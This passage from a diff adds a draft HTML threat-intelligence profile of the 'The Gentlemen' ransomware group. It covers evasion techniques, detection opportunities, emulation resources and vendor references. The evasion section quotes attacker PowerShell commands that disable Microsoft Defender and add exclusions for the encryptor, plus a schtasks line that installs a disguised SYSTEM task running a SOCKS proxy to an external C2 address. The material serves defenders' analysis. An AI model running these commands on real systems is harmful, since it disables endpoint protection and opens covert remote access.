+          <span class="evasion-tag edr">EDR BYPASS</span>
+          <span class="evasion-tag">PowerShell</span>
+        </div>
+        <div class="evasion-desc">Scripted disabling of Microsoft Defender real-time monitoring and the underlying WinDefend service, run with local administrative rights immediately prior to payload execution (Huntress, 2026).</div>
+        <div class="evasion-detail">Set-MpPreference -DisableRealtimeMonitoring $true
+Stop-Service -Name WinDefend -Force
+Set-Service -Name WinDefend -StartupType Disabled</div>
+      </div>
+      <div class="evasion-item">
+        <div class="evasion-header">
+          <span class="evasion-technique">Defender Exclusion Abuse</span>
+          <span class="evasion-ttp">T1562.001</span>
+        </div>
+        <div class="evasion-tags">
+          <span class="evasion-tag edr">EDR BYPASS</span>
+          <span class="evasion-tag">PowerShell</span>
+        </div>
+        <div class="evasion-desc">Adds the encryptor's own path/process as a Defender exclusion, additionally excluding the entire C:\ volume, and disables Controlled Folder Access. Huntress observed this sequence run specifically after an initial encryptor deployment attempt had failed, followed by redeployment of the ransomware executable — indicating this is used as an active-troubleshooting fallback by affiliates, not only a first-attempt default (Huntress, 2026).</div>
+        <div class="evasion-detail">Add-MpPreference -ExclusionProcess C:\Users\[REDACTED]\downloads\G_hlm7jj_windows_amd64.exe -Force
+Add-MpPreference -ExclusionPath C:\ -Force
+Set-MpPreference -EnableControlledFolderAccess Disabled -Force</div>
+      </div>
+      <div class="evasion-item">
+        <div class="evasion-header">
+          <span class="evasion-technique">Selective Event Log Clearing</span>
+          <span class="evasion-ttp">T1070.001</span>
+        </div>
+        <div class="evasion-tags">
+          <span class="evasion-tag siem">SIEM EVASION</span>
+        </div>
+        <div class="evasion-desc">Targets only the Security, System, and Application Windows Event Logs specifically, rather than a blanket wipe. Log-clearing success is itself verifiable via the log-clear events it generates (Event ID 104 for Application/System, Event ID 1102 for Security) — and other Windows event logs (e.g. PowerShell operational, Task Scheduler) are notably left untouched by this routine, which Huntress flags as a genuine detection opportunity (Huntress, 2026).</div>
+        <div class="evasion-detail">Verification artifacts left behind:
+Event ID 104 — Application/System log cleared
+Event ID 1102 — Security log cleared
+(Other Windows event log channels: not cleared by this routine — detection opportunity)</div>
+      </div>
+      <div class="evasion-item">
+        <div class="evasion-header">
+          <span class="evasion-technique">SOCKS Proxy C2 via Disguised Scheduled Task</span>
+          <span class="evasion-ttp">T1090 / T1053.005</span>
+        </div>
+        <div class="evasion-tags">
+          <span class="evasion-tag network">NETWORK</span>
+          <span class="evasion-tag siem">SIEM EVASION</span>
+        </div>
+        <div class="evasion-desc">Persistent SOCKS proxy tunnel established via a scheduled task running every two minutes as SYSTEM, executing a binary disguised with a legitimate-sounding name (<code>svchost32.exe</code> — deliberately similar to the genuine Windows <code>svchost.exe</code>) staged in <code>C:\Windows\Temp</code>. Huntress notes the task itself generates noisy, detectable Task Scheduler forensic events (IDs 107, 101, 203) that survive the group's selective log-clearing routine, since Task Scheduler logs are not among the logs it clears (Huntress, 2026).</div>
+        <div class="evasion-detail">schtasks /create /tn WindowsConnSvc /tr C:\Windows\Temp\svchost32.exe client 193.233.202[.]17:44729 R:1081:socks /sc minute /mo 2 /ru SYSTEM /f</div>
+      </div>
+      <div class="evasion-item">
+        <div class="evasion-header">
+          <span class="evasion-technique">Firewall / LSA / SMB1 Weakening</span>
+          <span class="evasion-ttp">T1562.004</span>
+        </div>
+        <div class="evasion-tags">
+          <span class="evasion-tag edr">EDR BYPASS</span>
+          <span class="evasion-tag network">NETWORK</span>
+        </div>
+        <div class="evasion-desc">Disables Windows Firewall across all profiles, modifies LSA registry settings to permit anonymous access, and re-enables the legacy SMB1 protocol — each weakening a distinct network-visibility or access-control layer ahead of lateral movement (Microsoft Security Blog, 2026-05-28). Specific command syntax/registry values for this step are not publicly documented in the source material reviewed as of this compile date — noted as a gap rather than reconstructed.</div>
+        <div class="evasion-detail">Specific commands/registry values not publicly documented as of 2026-09-08.</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SECTION 12 -->
+<div class="section">
+  <div class="section-header">
+    <div class="section-num">12</div>
+    <div class="section-title">Emulation Resources <small>MITRE CTID &amp; Published Adversary Emulation Plans</small></div>
+  </div>
+  <div class="section-body">
+    <div class="ctid-block not-available">
+      <div class="ctid-header">
+        <span class="ctid-tag not-available">MITRE CTID — ADVERSARY EMULATION PLAN</span>
+        <span class="ctid-title">Not Available</span>
+      </div>
+      <div class="ctid-body">No MITRE Center for Threat-Informed Defense adversary emulation plan has been published for The Gentlemen as of 2026-09-08. Checked directly against the current adversary_emulation_library repository listing (11 full plans on file: APT29, Blind Eagle, Carbanak Group, FIN6, FIN7, menuPass, OceanLotus, OilRig, Sandworm, Turla, Wizard Spider) — this group is not among them, consistent with its recency.</div>
+    </div>
+    <div style="margin-top: 14px; font-family: var(--mono); font-size: 9px; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 10px;">Additional Emulation Resources</div>
+    <div class="ref-list">
+      <div class="ref-item">
+        <div class="ref-source">Check Point</div>
+        <div>
+          <div class="ref-detail"><a href="https://research.checkpoint.com/2026/thus-spoke-the-gentlemen/" target="_blank">Thus Spoke…The Gentlemen — includes YARA detection rule</a></div>
+          <div class="ref-date">YARA rule (strings: "Silent mode", "README-GENTLEMEN.txt", "gentlemen.bmp", "gentlemen_system") · Accessed: 2026-09-08</div>
+        </div>
+      </div>
+      <div class="ref-item">
+        <div class="ref-source">Microsoft</div>
+        <div>
+          <div class="ref-detail"><a href="https://www.microsoft.com/en-us/security/blog/2026/05/28/the-gentlemen-ransomware-dissecting-a-self-propagating-go-encryptor/" target="_blank">The Gentlemen ransomware: Dissecting a self-propagating Go encryptor</a></div>
+          <div class="ref-date">Defender signature (Ransom:Win64/Gentlemen.A) + Advanced Hunting KQL queries · Accessed: 2026-09-08</div>
+        </div>
+      </div>
+      <div class="ref-item">
+        <div class="ref-source">GAP</div>
+        <div>
+          <div class="ref-detail">No Atomic Red Team tests or SigmaHQ-published detection rules specific to this group were identified in source material reviewed.</div>
+          <div class="ref-date">Stated as of: 2026-09-08</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SECTION 13 -->
+<div class="section">
+  <div class="section-header">
+    <div class="section-num">13</div>
+    <div class="section-title">References <small>URLs are NOT defanged — navigate directly</small></div>
+  </div>
+  <div class="section-body">
+    <div class="ref-list">
+      <div class="ref-item">
+        <div class="ref-source">Check Point</div>
+        <div>
+          <div class="ref-detail"><a href="https://research.checkpoint.com/2026/thus-spoke-the-gentlemen/" target="_blank">Thus Spoke…The Gentlemen</a></div>
+          <div class="ref-date">Accessed: 2026-09-08</div>
+        </div>
+      </div>
+      <div class="ref-item">
+        <div class="ref-source">Halcyon</div>
+        <div>
+          <div class="ref-detail"><a href="https://www.halcyon.ai/ransomware-research-reports/threat-assessment-the-gentlemen-ransomware-group" target="_blank">The Gentlemen Ransomware Group Is Scaling Faster Than Any Other Group on Record</a></div>
+          <div class="ref-date">Accessed: 2026-09-08</div>
+        </div>
+      </div>
+      <div class="ref-item">
+        <div class="ref-source">FortiGuard</div>
+        <div>
+          <div class="ref-detail"><a href="https://www.fortiguard.com/threat-actor/6387/the-gentlemen-ransomware" target="_blank">The Gentlemen Ransomware — Threat Actor</a></div>
+          <div class="ref-date">Accessed: 2026-09-08</div>
+        </div>
+      </div>
+      <div class="ref-item">
+        <div class="ref-source">The Cyber Express</div>
+        <div>
+          <div class="ref-detail"><a href="https://thecyberexpress.com/the-gentlemen-ransomware-group/" target="_blank">The Gentlemen Ransomware Group's Global Rise In H1 2026</a></div>
+          <div class="ref-date">Accessed: 2026-09-08</div>
+        </div>
+      </div>
+      <div class="ref-item">
+        <div class="ref-source">Microsoft</div>
+        <div>
+          <div class="ref-detail"><a href="https://www.microsoft.com/en-us/security/blog/2026/05/28/the-gentlemen-ransomware-dissecting-a-self-propagating-go-encryptor/" target="_blank">The Gentlemen ransomware: Dissecting a self-propagating Go encryptor</a></div>
+          <div class="ref-date">Accessed: 2026-09-08</div>
+        </div>
+      </div>
+      <div class="ref-item">
+        <div class="ref-source">Huntress</div>
+        <div>
+          <div class="ref-detail"><a href="https://www.huntress.com/blog/the-gentlemen-ransomware-defense-evasion-ttps" target="_blank">The Gentleman Ransomware | Defense Evasion TTPs Uncovered</a></div>
+          <div class="ref-date">Accessed: 2026-09-08</div>
+        </div>
+      </div>
+      <div class="ref-item">
+        <div class="ref-source">The Insurer</div>
+        <div>
+          <div class="ref-detail"><a href="https://www.theinsurer.com/cyber-risk/news/the-gentlemen-ransomware-group-emerges-as-most-active-threat-actor-in-q2-2026-07-24/" target="_blank">The Gentlemen ransomware group emerges as most active threat actor in Q2</a></div>
+          <div class="ref-date">Published: 2026-07-24 · Accessed: 2026-09-08</div>
+        </div>
+      </div>
+      <div class="ref-item">
+        <div class="ref-source">MITRE CTID</div>
+        <div>
+          <div class="ref-detail"><a href="https://github.com/center-for-threat-informed-defense/adversary_emulation_library" target="_blank">Adversary Emulation Library (repository listing)</a></div>
+          <div class="ref-date">Accessed: 2026-09-08</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="footer">
+  <div>// THREAT ACTOR PROFILE · <span class="draft-warn">DRAFT — REQUIRES HUMAN REVIEW BEFORE DISSEMINATION</span></div>
+  <div>TLP:CLEAR · COMPILED: 2026-09-08 · 7 primary sources, all substantially derived from a single May 2026 internal-data leak plus independent vendor telemetry</div>
+  <div>Group formed July 2025 · No MITRE G-ID · No CTID emulation plan · No government sanction/indictment on file</div>
+</div>
+
+</body>
+</html>
